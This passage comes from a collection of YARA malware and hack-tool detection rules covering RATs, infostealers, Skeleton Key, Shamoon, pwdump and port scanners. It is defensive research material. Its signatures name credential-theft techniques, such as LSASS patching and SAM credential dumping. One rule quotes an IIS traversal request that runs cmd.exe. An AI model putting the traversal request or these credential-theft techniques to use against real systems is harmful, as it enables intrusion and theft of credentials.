        (2 of ($debug*) or 2 of ($log*) or all of ($error*)) and not any of ($filter*)
}

rule RCS_Scout
{
    meta:
        description = "Hacking Team RCS Scout"
	author = "botherder https://github.com/botherder"

    strings:
        $filter1 = "$engine5"
        $filter2 = "$start4"
        $filter3 = "$upd2"
        $filter4 = "$lookma6"

        $engine1 = /(E)ngine started/ wide ascii
        $engine2 = /(R)unning in background/ wide ascii
        $engine3 = /(L)ocking doors/ wide ascii
        $engine4 = /(R)otors engaged/ wide ascii
        $engine5 = /(I)\'m going to start it/ wide ascii

        $start1 = /Starting upgrade\!/ wide ascii
        $start2 = /(I)\'m going to start the program/ wide ascii
        $start3 = /(i)s it ok\?/ wide ascii
        $start4 = /(C)lick to start the program/ wide ascii

        $upd1 = /(U)pdJob/ wide ascii
        $upd2 = /(U)pdTimer/ wide ascii

        $lookma1 = /(O)wning PCI bus/ wide
        $lookma2 = /(F)ormatting bios/ wide
        $lookma3 = /(P)lease insert a disk in drive A:/ wide
        $lookma4 = /(U)pdating CPU microcode/ wide
        $lookma5 = /(N)ot sure what's happening/ wide
        $lookma6 = /(L)ook ma, no thread id\! \\\\o\// wide        

    condition:
        (all of ($engine*) or all of ($start*) or all of ($upd*) or 4 of ($lookma*)) and not any of ($filter*)
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule RegSubDatCode : RegSubDat Family 
{
    meta:
        description = "RegSubDat code features"
        author = "Seth Hardy"
        last_modified = "2014-07-14"
    
    strings:
        // decryption loop
        $ = { 80 34 3? 99 40 (3D FB 65 00 00 | 3B C6) 7? F? }
        // push then pop values
        $ = { 68 FF FF 7F 00 5? }
        $ = { 68 FF 7F 00 00 5? }
    
    condition:
        all of them
}

rule RegSubDatStrings : RegSubDat Family
{
    meta:
        description = "RegSubDat Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-07-14"
        
    strings:
        $avg1 = "Button"
        $avg2 = "Allow"
        $avg3 = "Identity Protection"
        $avg4 = "Allow for all"
        $avg5 = "AVG Firewall Asks For Confirmation"
        $mutex = "0x1A7B4C9F"
        
    condition:
       all of ($avg*) or $mutex
}

rule RegSubDat : Family
{
    meta:
        description = "RegSubDat"
        author = "Seth Hardy"
        last_modified = "2014-07-14"
        
    condition:
        RegSubDatCode or RegSubDatStrings
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule RooterCode : Rooter Family 
{
    meta:
        description = "Rooter code features"
        author = "Seth Hardy"
        last_modified = "2014-07-10"
    
    strings:
        // xor 0x30 decryption
        $ = { 80 B0 ?? ?? ?? ?? 30 40 3D 00 50 00 00 7C F1 }
    
    condition:
        any of them
}

rule RooterStrings : Rooter Family
{
    meta:
        description = "Rooter Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-07-10"
        
    strings:
        $group1 = "seed\x00"
        $group2 = "prot\x00"
        $group3 = "ownin\x00"
        $group4 = "feed0\x00"
        $group5 = "nown\x00"

    condition:
       3 of ($group*)
}


rule Rooter : Family
{
    meta:
        description = "Rooter"
        author = "Seth Hardy"
        last_modified = "2014-07-10"
        
    condition:
        RooterCode or RooterStrings
}

rule RookieStrings : Rookie Family
{
    meta:
        description = "Rookie Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
        
    strings:
        $ = "RookIE/1.0"
        
    condition:
       any of them
}

rule RookieCode : Rookie Family 
{
    meta:
        description = "Rookie code features"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
        
    strings:
        // hidden AutoConfigURL
        $ = { C6 ?? ?? ?? 41 C6 ?? ?? ?? 75 [4] C6 ?? ?? ?? 6F C6 ?? ?? ?? 43 C6 ?? ?? ?? 6F C6 ?? ?? ?? 6E C6 ?? ?? ?? 66 }
        // hidden ProxyEnable
        $ = { C6 ?? ?? ?? 50 [4] C6 ?? ?? ?? 6F C6 ?? ?? ?? 78 C6 ?? ?? ?? 79 C6 ?? ?? ?? 45 C6 ?? ?? ?? 6E C6 ?? ?? ?? 61 }
        // xor on rand value?
        $ = { 8B 1D 10 A1 40 00 [18] FF D3 8A 16 32 D0 88 16 }

    condition:
        any of them
}

rule Rookie : Family
{
    meta:
        description = "Rookie"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
        
    condition:
        RookieCode or RookieStrings
}
rule rovnix_downloader
{
	meta:
		author="Intel Security"
		description="Rovnix downloader with sinkhole checks"
		reference = "https://blogs.mcafee.com/mcafee-labs/rovnix-downloader-sinkhole-time-checks/"
	strings:
			$sink1= "control"
			$sink2 = "sink"
			$sink3 = "hole"
			$sink4= "dynadot"
			$sink5= "block"
			$sink6= "malw"
			$sink7= "anti"
			$sink8= "googl"
			$sink9= "hack"
			$sink10= "trojan"
			$sink11= "abuse"
			$sink12= "virus"
			$sink13= "black"
			$sink14= "spam"
			$boot= "BOOTKIT_DLL.dll"
			$mz = { 4D 5A }
	condition:
		$mz in (0..2) and all of ($sink*) and $boot
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule SafeNetCode : SafeNet Family 
{
    meta:
        description = "SafeNet code features"
        author = "Seth Hardy"
        last_modified = "2014-07-16"
        
    strings:
        // add edi, 14h; cmp edi, 50D0F8h
        $ = { 83 C7 14 81 FF F8 D0 40 00 }
    condition:
        any of them
}

rule SafeNetStrings : SafeNet Family
{
    meta:
        description = "Strings used by SafeNet"
        author = "Seth Hardy"
        last_modified = "2014-07-16"
        
    strings:
        $ = "6dNfg8Upn5fBzGgj8licQHblQvLnUY19z5zcNKNFdsDhUzuI8otEsBODrzFCqCKr"
        $ = "/safe/record.php"
        $ = "_Rm.bat" wide ascii
        $ = "try\x0d\x0a\x09\x09\x09\x09  del %s" wide ascii
        $ = "Ext.org" wide ascii
        
    condition:
        any of them

}

rule SafeNet : Family
{
    meta:
        description = "SafeNet family"
        
    condition:
        SafeNetCode or SafeNetStrings
        
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Vinsula_Sayad_Binder : infostealer
{
    meta:
        Author      = "Vinsula, Inc"
        Date        = "2014/06/20"
        Description = "Sayad Infostealer Binder"
        Reference   = "http://vinsula.com/2014/07/20/sayad-flying-kitten-infostealer-malware/"

    strings: 
        $pdbstr = "\\Projects\\C#\\Sayad\\Source\\Binder\\obj\\Debug\\Binder.pdb" 
        $delphinativestr = "DelphiNative.dll" nocase
        $sqlite3str = "sqlite3.dll" nocase
        $winexecstr = "WinExec" 
        $sayadconfig = "base.dll" wide

    condition:
        all of them
}

rule Vinsula_Sayad_Client : infostealer
{
    meta:
        Author      = "Vinsula, Inc"
        Date        = "2014/06/20"
        Description = "Sayad Infostealer Client"
        Reference   = "http://vinsula.com/2014/07/20/sayad-flying-kitten-infostealer-malware/"

    strings: 
        $pdbstr = "\\Projects\\C#\\Sayad\\Source\\Client\\bin\\x86\\Debug\\Client.pdb" 
        $sayadconfig = "base.dll" wide
        $sqlite3str = "sqlite3.dll" nocase
        $debugstr01 = "Config loaded" wide
        $debugstr02 = "Config parsed" wide
        $debugstr03 = "storage uploader" wide
        $debugstr04 = "updater" wide
        $debugstr05 = "keylogger" wide
        $debugstr06 = "Screenshot" wide
        $debugstr07 = "sqlite found & start collectiong data" wide
        $debugstr08 = "Machine info collected" wide
        $debugstr09 = "browser ok" wide
        $debugstr10 = "messenger ok" wide
        $debugstr11 = "vpn ok" wide
        $debugstr12 = "ftp client ok" wide
        $debugstr13 = "ftp server ok" wide
        $debugstr14 = "rdp ok" wide
        $debugstr15 = "kerio ok" wide
        $debugstr16 = "skype ok" wide
        $debugstr17 = "serialize data ok" wide
        $debugstr18 = "Keylogged" wide

    condition:
        all of them
}/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule ScarhiknStrings : Scarhikn Family
{
    meta:
        description = "Scarhikn Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
        
    strings:
        $ = "9887___skej3sd"
        $ = "haha123"
        
    condition:
       any of them
}



rule ScarhiknCode : Scarhikn Family 
{
    meta:
        description = "Scarhikn code features"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
    
    strings:
        // decryption
        $ = { 8B 06 8A 8B ?? ?? ?? ?? 30 0C 38 03 C7 55 43 E8 ?? ?? ?? ?? 3B D8 59 72 E7 }
        $ = { 8B 02 8A 8D ?? ?? ?? ?? 30 0C 30 03 C6 8B FB 83 C9 FF 33 C0 45 F2 AE F7 D1 49 3B E9 72 E2 }
    
    condition:
        any of them
}

rule Scarhikn : Family
{
    meta:
        description = "Scarhikn"
        author = "Seth Hardy"
        last_modified = "2014-06-25"
        
    condition:
        ScarhiknCode or ScarhiknStrings
}







/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Scieron
{
    meta:
        author = "Symantec Security Response"
        ref = "http://www.symantec.com/connect/tr/blogs/scarab-attackers-took-aim-select-russian-targets-2012"
        date = "22.01.15"

    strings:
        // .text:10002069 66 83 F8 2C                       cmp     ax, ','
        // .text:1000206D 74 0C                             jz      short loc_1000207B
        // .text:1000206F 66 83 F8 3B                       cmp     ax, ';'
        // .text:10002073 74 06                             jz      short loc_1000207B
        // .text:10002075 66 83 F8 7C                       cmp     ax, '|'
        // .text:10002079 75 05                             jnz     short loc_10002080
        $code1 = {66 83 F? 2C 74 0C 66 83 F? 3B 74 06 66 83 F? 7C 75 05}
        
        // .text:10001D83 83 F8 09                          cmp     eax, 9          ; switch 10 cases
        // .text:10001D86 0F 87 DB 00 00 00                 ja      loc_10001E67    ; jumptable 10001D8C default case
        // .text:10001D8C FF 24 85 55 1F 00+                jmp     ds:off_10001F55[eax*4] ; switch jump
        $code2 = {83 F? 09 0F 87 ?? 0? 00 00 FF 24}
        
        $str1  = "IP_PADDING_DATA" wide ascii
        $str2  = "PORT_NUM" wide ascii
        
    condition:
        all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule ShadowTech_2
{
    meta:
        description = "ShadowTech RAT"
	author = "botherder https://github.com/botherder"

    strings:
        $string1 = /\#(S)trings/
        $string2 = /\#(G)UID/
        $string3 = /\#(B)lob/
        $string4 = /(S)hadowTech Rat\.exe/
        $string5 = /(S)hadowTech_Rat/

    condition:
        all of them
}
rule ShadowTech
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/ShadowTech"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "ShadowTech" nocase
		$b = "DownloadContainer"
		$c = "MySettings"
		$d = "System.Configuration"
		$newline = "#-@NewLine@-#" wide
		$split = "pSIL" wide
		$key = "ESIL" wide

	condition:
		4 of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"


rule CrowdStrike_Shamoon_DroppedFile { 
	meta:
		description = "Rule to detect Shamoon malware http://goo.gl/QTxohN"
		reference = "http://www.rsaconference.com/writable/presentations/file_upload/exp-w01-hacking-exposed-day-of-destruction.pdf"
	strings:
		$testn123 = "test123" wide
		$testn456 = "test456" wide
		$testn789 = "test789" wide
		$testdomain = "testdomain.com" wide $pingcmd = "ping -n 30 127.0.0.1 >nul" wide
	condition:
		(any of ($testn*) or $pingcmd) and $testdomain
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule skeleton_key_patcher
{
	meta:
		description = "Skeleton Key Patcher from Dell SecureWorks Report http://goo.gl/aAk3lN"
		author = "Dell SecureWorks Counter Threat Unit"
		reference = "http://goo.gl/aAk3lN"
		date = "2015/01/13"
		score = 70
	strings:
		$target_process = "lsass.exe" wide
		$dll1 = "cryptdll.dll"
		$dll2 = "samsrv.dll"

		$name = "HookDC.dll"

		$patched1 = "CDLocateCSystem"
		$patched2 = "SamIRetrievePrimaryCredentials"
		$patched3 = "SamIRetrieveMultiplePrimaryCredentials"
	condition:
		all of them
}

rule skeleton_key_injected_code
{
	meta:
		description = "Skeleton Key injected Code http://goo.gl/aAk3lN"
		author = "Dell SecureWorks Counter Threat Unit"
		reference = "http://goo.gl/aAk3lN"
		date = "2015/01/13"
		score = 70
	strings:
		$injected = { 33 C0 85 C9 0F 95 C0 48 8B 8C 24 40 01 00 00 48 33 CC E8 4D 02 00 00 48 81 C4 58 01 00 00 C3 }

		$patch_CDLocateCSystem = { 48 89 5C 24 08 48 89 74 24 10 57 48 83 EC 20 48 8B FA 8B F1 E8 ?? ?? ?? ?? 48 8B D7 8B CE 48 8B D8 FF 50 10 44 8B D8 85 C0 0F 88 A5 00 00 00 48 85 FF 0F 84 9C 00 00 00 83 FE 17 0F 85 93 00 00 00 48 8B 07 48 85 C0 0F 84 84 00 00 00 48 83 BB 48 01 00 00 00 75 73 48 89 83 48 01 00 00 33 D2 }

		$patch_SamIRetrievePrimaryCredential = { 48 89 5C 24 08 48 89 6C 24 10 48 89 74 24 18 57 48 83 EC 20 49 8B F9 49 8B F0 48 8B DA 48 8B E9 48 85 D2 74 2A 48 8B 42 08 48 85 C0 74 21 66 83 3A 26 75 1B 66 83 38 4B 75 15 66 83 78 0E 73 75 0E 66 83 78 1E 4B 75 07 B8 A1 02 00 C0 EB 14 E8 ?? ?? ?? ?? 4C 8B CF 4C 8B C6 48 8B D3 48 8B CD FF 50 18 48 8B 5C 24 30 48 8B 6C 24 38 48 8B 74 24 40 48 83 C4 20 5F C3 }

		$patch_SamIRetrieveMultiplePrimaryCredential  = { 48 89 5C 24 08 48 89 6C 24 10 48 89 74 24 18 57 48 83 EC 20 41 8B F9 49 8B D8 8B F2 8B E9 4D 85 C0 74 2B 49 8B 40 08 48 85 C0 74 22 66 41 83 38 26 75 1B 66 83 38 4B 75 15 66 83 78 0E 73 75 0E 66 83 78 1E 4B 75 07 B8 A1 02 00 C0 EB 12 E8 ?? ?? ?? ?? 44 8B CF 4C 8B C3 8B D6 8B CD FF 50 20 48 8B 5C 24 30 48 8B 6C 24 38 48 8B 74 24 40 48 83 C4 20 5F C3 }

	condition:
		any of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.
*/



rule custom_ssh_backdoor_server {
	meta:
		description = "Custome SSH backdoor based on python and paramiko - file server.py"
		author = "Florian Roth"
		reference = "https://goo.gl/S46L3o"
		date = "2015-05-14"
		hash = "0953b6c2181249b94282ca5736471f85d80d41c9"
	strings:
		$s0 = "command= raw_input(\"Enter command: \").strip('n')" fullword ascii
		$s1 = "print '[-] (Failed to load moduli -- gex will be unsupported.)'" fullword ascii
		$s2 = "print '[-] Listen/bind/accept failed: ' + str(e)" fullword ascii
		$s3 = "chan.send(command)" fullword ascii
		$s4 = "print '[-] SSH negotiation failed.'" fullword ascii
		$s5 = "except paramiko.SSHException, x:" fullword ascii
	condition:
		filesize < 10KB and 5 of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule universal_1337_stealer_serveur : Stealer
{
	meta:
		author="Kevin Falcoz"
		date="24/02/2013"
		description="Universal 1337 Stealer Serveur"
		
	strings:
		$signature1={2A 5B 53 2D 50 2D 4C 2D 49 2D 54 5D 2A} /*[S-P-L-I-T]*/
		$signature2={2A 5B 48 2D 45 2D 52 2D 45 5D 2A} /*[H-E-R-E]*/
		$signature3={46 54 50 7E} /*FTP~*/
		$signature4={7E 31 7E 31 7E 30 7E 30} /*~1~1~0~0*/
		
	condition:
		$signature1 and $signature2 or $signature3 and $signature4
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule RSharedStrings : Surtr Family {
	meta:
		description = "identifiers for remote and gmremote"
		author = "Katie Kleemola"
		last_updated = "07-21-2014"
	
	strings:
		$ = "nView_DiskLoydb" wide
		$ = "nView_KeyLoydb" wide
		$ = "nView_skins" wide
		$ = "UsbLoydb" wide
		$ = "%sBurn%s" wide
		$ = "soul" wide

	condition:
		any of them

}

rule RemoteStrings : Remote Variant Surtr Family {
	meta:
		description = "indicators for remote.dll - surtr stage 2"
		author = "Katie Kleemola"
		last_updated = "07-21-2014"
	
	strings:
		$ = "\x00Remote.dll\x00"
		$ = "\x00CGm_PlugBase::"
		$ = "\x00ServiceMain\x00_K_H_K_UH\x00"
		$ = "\x00_Remote_\x00" wide
	condition:
		any of them
}

rule GmRemoteStrings : GmRemote Variant Family Surtr {
	meta:
		description = "identifiers for gmremote: surtr stage 2"
		author = "Katie Kleemola"
		last_updated = "07-21-2014"
	
	strings:
		$ = "\x00x86_GmRemote.dll\x00"
		$ = "\x00D:\\Project\\GTProject\\Public\\List\\ListManager.cpp\x00"
		$ = "\x00GmShutPoint\x00"
		$ = "\x00GmRecvPoint\x00"
		$ = "\x00GmInitPoint\x00"
		$ = "\x00GmVerPoint\x00"
		$ = "\x00GmNumPoint\x00"
		$ = "_Gt_Remote_" wide
		$ = "%sBurn\\workdll.tmp" wide
	
	condition:
		any of them

}


rule GmRemote : Family Surtr Variant GmRemote {
	meta:
		description = "identifier for gmremote"
		author = "Katie Kleemola"
		last_updated = "07-25-2014"
	
	condition:
		RSharedStrings and GmRemoteStrings
}

rule Remote : Family Surtr Variant Remote {
	meta:
		description = "identifier for remote"
		author = "Katie Kleemola"
		last_updated = "07-25-2014"
	
	condition:
		RSharedStrings and RemoteStrings
}

rule SurtrStrings : Surtr Family {	
	meta: 
		author = "Katie Kleemola"
		description = "Strings for Surtr"
		last_updated = "2014-07-16"

	strings:
		$ = "\x00soul\x00"
		$ = "\x00InstallDll.dll\x00"
		$ = "\x00_One.dll\x00"
		$ = "_Fra.dll"
		$ = "CrtRunTime.log"
		$ = "Prod.t"
		$ = "Proe.t"
		$ = "Burn\\"
		$ = "LiveUpdata_Mem\\"

	condition:
		any of them

}

rule SurtrCode : Surtr Family {
	meta: 
		author = "Katie Kleemola"
		description = "Code features for Surtr Stage1"
		last_updated = "2014-07-16"
	
	strings:
		//decrypt config
		$ = { 8A ?? ?? 84 ?? ?? 74 ?? 3C 01 74 ?? 34 01 88 41 3B ?? 72 ?? }
		//if Burn folder name is not in strings
		$ = { C6 [3] 42 C6 [3] 75 C6 [3] 72 C6 [3] 6E C6 [3] 5C }
		//mov char in _Fire
		$ = { C6 [3] 5F C6 [3] 46 C6 [3] 69 C6 [3] 72 C6 [3] 65 C6 [3] 2E C6 [3] 64 }

	condition:
		any of them

}

rule Surtr : Family {
	meta:
		author = "Katie Kleemola"
		description = "Rule for Surtr Stage One"
		last_updated = "2014-07-16"

	condition:
		SurtrStrings or SurtrCode

}



/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule T5000Strings : T5000 Family
{
    meta:
        description = "T5000 Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-26"
        
    strings:
        $ = "_tmpR.vbs"
        $ = "_tmpg.vbs"
        $ = "Dtl.dat" wide ascii
        $ = "3C6FB3CA-69B1-454f-8B2F-BD157762810E"
        $ = "EED5CA6C-9958-4611-B7A7-1238F2E1B17E"
        $ = "8A8FF8AD-D1DE-4cef-B87C-82627677662E"
        $ = "43EE34A9-9063-4d2c-AACD-F5C62B849089"
        $ = "A8859547-C62D-4e8b-A82D-BE1479C684C9"
        $ = "A59CF429-D0DD-4207-88A1-04090680F714"
        $ = "utd_CE31" wide ascii
        $ = "f:\\Project\\T5000\\Src\\Target\\1 KjetDll.pdb"
        $ = "l:\\MyProject\\Vc 7.1\\T5000\\T5000Ver1.28\\Target\\4 CaptureDLL.pdb"
        $ = "f:\\Project\\T5000\\Src\\Target\\4 CaptureDLL.pdb"
        $ = "E:\\VS2010\\xPlat2\\Release\\InstRes32.pdb"
        
    condition:
       any of them
}

rule T5000 : Family
{
    meta:
        description = "T5000"
        author = "Seth Hardy"
        last_modified = "2014-06-26"
        
    condition:
        T5000Strings
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

rule Tedroo : Spammer
{
	meta:
		author="Kevin Falcoz"
		date="22/11/2015"
		description="Tedroo Spammer"

	strings:
		$signature1={25 73 25 73 2E 65 78 65}
		$signature2={5F 6C 6F 67 2E 74 78 74}

	condition:
		$signature1 and $signature2
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/*

   THOR APT Scanner - Hack Tool Extract
   This rulset is a subset of all hack tool rules included in our
   APT Scanner THOR - the full featured APT scanner.

   We will frequently update this file with new rules rated TLP:WHITE

   Florian Roth
   BSK Consulting GmbH
   Web: bsk-consulting.de

   revision: 20150510

   License: Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)
	Copyright and related rights waived via https://creativecommons.org/licenses/by-nc-sa/4.0/

*/

/* WCE */

rule WindowsCredentialEditor
{
    meta:
    	description = "Windows Credential Editor" threat_level = 10 score = 90
    strings:
		$a = "extract the TGT session key"
		$b = "Windows Credentials Editor"
    condition:
    	$a or $b
}

rule Amplia_Security_Tool
{
    meta:
		description = "Amplia Security Tool"
		score = 60
		nodeepdive = 1
    strings:
		$a = "Amplia Security"
		$b = "Hernan Ochoa"
		$c = "getlsasrvaddr.exe"
		$d = "Cannot get PID of LSASS.EXE"
		$e = "extract the TGT session key"
		$f = "PPWDUMP_DATA"
    condition: 1 of them
}

/* pwdump/fgdump */

rule PwDump
{
	meta:
		description = "PwDump 6 variant"
		author = "Marc Stroebel"
		date = "2014-04-24"
		score = 70
	strings:
		$s5 = "Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineNa"
		$s6 = "Unable to query service status. Something is wrong, please manually check the st"
		$s7 = "pwdump6 Version %s by fizzgig and the mighty group at foofus.net" fullword
	condition:
		all of them
}

rule PScan_Portscan_1 {
	meta:
		description = "PScan - Port Scanner"
		author = "F. Roth"
		score = 50
	strings:
		$a = "00050;0F0M0X0a0v0}0"
		$b = "vwgvwgvP76"
		$c = "Pr0PhOFyP"
	condition:
		all of them
}

rule HackTool_Samples {
	meta:
		description = "Hacktool"
		score = 50
	strings:
		$a = "Unable to uninstall the fgexec service"
		$b = "Unable to set socket to sniff"
		$c = "Failed to load SAM functions"
		$d = "Dump system passwords"
		$e = "Error opening sam hive or not valid file"
		$f = "Couldn't find LSASS pid"
		$g = "samdump.dll"
		$h = "WPEPRO SEND PACKET"
		$i = "WPE-C1467211-7C89-49c5-801A-1D048E4014C4"
		$j = "Usage: unshadow PASSWORD-FILE SHADOW-FILE"
		$k = "arpspoof\\Debug"
		$l = "Success: The log has been cleared"
		$m = "clearlogs [\\\\computername"
		$n = "DumpUsers 1."
		$o = "dictionary attack with specified dictionary file"
		$p = "by Objectif Securite"
		$q = "objectif-securite"
		$r = "Cannot query LSA Secret on remote host"
		$s = "Cannot write to process memory on remote host"
		$t = "Cannot start PWDumpX service on host"
		$u = "usage: %s <system hive> <security hive>"
		$v = "username:domainname:LMhash:NThash"
		$w = "<server_name_or_ip> | -f <server_list_file> [username] [password]"
		$x = "Impersonation Tokens Available"
		$y = "failed to parse pwdump format string"
		$z = "Dumping password"
	condition:
		1 of them
}

/* Disclosed hack tool set */

rule Fierce2
{
	meta:
		author = "Florian Roth"
		description = "This signature detects the Fierce2 domain scanner"
		date = "07/2014"
		score = 60
	strings:
		$s1 = "$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,"
	condition:
		1 of them
}

rule Ncrack
{
	meta:
		author = "Florian Roth"
		description = "This signature detects the Ncrack brute force tool"
		date = "07/2014"
		score = 60
	strings:
		$s1 = "NcrackOutputTable only supports adding up to 4096 to a cell via"
	condition:
		1 of them
}

rule SQLMap
{
	meta:
		author = "Florian Roth"
		description = "This signature detects the SQLMap SQL injection tool"
		date = "07/2014"
		score = 60
	strings:
		$s1 = "except SqlmapBaseException, ex:"
	condition:
		1 of them
}

rule PortScanner {
	meta:
		description = "Auto-generated rule on file PortScanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "b381b9212282c0c650cb4b0323436c63"
	strings:
		$s0 = "Scan Ports Every"
		$s3 = "Scan All Possible Ports!"
	condition:
		all of them
}

rule DomainScanV1_0 {
	meta:
		description = "Auto-generated rule on file DomainScanV1_0.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "aefcd73b802e1c2bdc9b2ef206a4f24e"
	strings:
		$s0 = "dIJMuX$aO-EV"
		$s1 = "XELUxP\"-\\"
		$s2 = "KaR\"U'}-M,."
		$s3 = "V.)\\ZDxpLSav"
		$s4 = "Decompress error"
		$s5 = "Can't load libmalware_rary"
		$s6 = "Can't load function"
		$s7 = "com0tl32:.d"
	condition:
		all of them
}

rule MooreR_Port_Scanner {
	meta:
		description = "Auto-generated rule on file MooreR Port Scanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "376304acdd0b0251c8b19fea20bb6f5b"
	strings:
		$s0 = "Description|"
		$s3 = "soft Visual Studio\\VB9yp"
		$s4 = "adj_fptan?4"
		$s7 = "DOWS\\SyMem32\\/o"
	condition:
		all of them
}

rule NetBIOS_Name_Scanner {
	meta:
		description = "Auto-generated rule on file NetBIOS Name Scanner.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "888ba1d391e14c0a9c829f5a1964ca2c"
	strings:
		$s0 = "IconEx"
		$s2 = "soft Visual Stu"
		$s4 = "NBTScanner!y&"
	condition:
		all of them
}

rule FeliksPack3___Scanners_ipscan {
	meta:
		description = "Auto-generated rule on file ipscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "6c1bcf0b1297689c8c4c12cc70996a75"
	strings:
		$s2 = "WCAP;}ECTED"
		$s4 = "NotSupported"
		$s6 = "SCAN.VERSION{_"
	condition:
		all of them
}

rule CGISscan_CGIScan {
	meta:
		description = "Auto-generated rule on file CGIScan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "338820e4e8e7c943074d5a5bc832458a"
	strings:
		$s1 = "Wang Products" fullword wide
		$s2 = "WSocketResolveHost: Cannot convert host address '%s'"
		$s3 = "tcp is the only protocol supported thru socks server"
	condition:
		all of ($s*)
}

rule IP_Stealing_Utilities {
	meta:
		description = "Auto-generated rule on file IP Stealing Utilities.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "65646e10fb15a2940a37c5ab9f59c7fc"
	strings:
		$s0 = "DarkKnight"
		$s9 = "IPStealerUtilities"
	condition:
		all of them
}

rule SuperScan4 {
	meta:
		description = "Auto-generated rule on file SuperScan4.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "78f76428ede30e555044b83c47bc86f0"
	strings:
		$s2 = " td class=\"summO1\">"
		$s6 = "REM'EBAqRISE"
		$s7 = "CorExitProcess'msc#e"
	condition:
		all of them

}
rule PortRacer {
	meta:
		description = "Auto-generated rule on file PortRacer.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "2834a872a0a8da5b1be5db65dfdef388"
	strings:
		$s0 = "Auto Scroll BOTH Text Boxes"
		$s4 = "Start/Stop Portscanning"
		$s6 = "Auto Save LogFile by pressing STOP"
	condition:
		all of them
}

rule scanarator {
	meta:
		description = "Auto-generated rule on file scanarator.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "848bd5a518e0b6c05bd29aceb8536c46"
	strings:
		$s4 = "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"
	condition:
		all of them
}

rule aolipsniffer {
	meta:
		description = "Auto-generated rule on file aolipsniffer.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "51565754ea43d2d57b712d9f0a3e62b8"
	strings:
		$s0 = "C:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB"
		$s1 = "dwGetAddressForObject"
		$s2 = "Color Transfer Settings"
		$s3 = "FX Global Lighting Angle"
		$s4 = "Version compatibility info"
		$s5 = "New Windows Thumbnail"
		$s6 = "Layer ID Generator Base"
		$s7 = "Color Halftone Settings"
		$s8 = "C:\\WINDOWS\\SYSTEM\\MSWINSCK.oca"
	condition:
		all of them
}

rule _Bitchin_Threads_ {
	meta:
		description = "Auto-generated rule on file =Bitchin Threads=.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "7491b138c1ee5a0d9d141fbfd1f0071b"
	strings:
		$s0 = "DarKPaiN"
		$s1 = "=BITCHIN THREADS"
	condition:
		all of them
}

rule cgis4_cgis4 {
	meta:
		description = "Auto-generated rule on file cgis4.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "d658dad1cd759d7f7d67da010e47ca23"
	strings:
		$s0 = ")PuMB_syJ"
		$s1 = "&,fARW>yR"
